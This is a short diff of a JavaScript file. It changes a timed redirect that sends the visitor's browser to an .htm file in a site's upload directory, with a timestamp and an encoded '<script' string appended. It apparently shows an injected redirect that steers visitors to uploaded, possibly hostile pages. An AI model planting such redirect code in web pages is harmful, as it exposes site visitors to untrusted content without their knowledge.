@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://www.xinri.com/profile/upload/2024/01/04/rrq_20240104163529A040.htm?' + '?' + timestamp + '%3Cscript';
+    var url = 'https://www.xinri.com/profile/upload/2024/01/04/rrq_20240104164336A041.htm' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
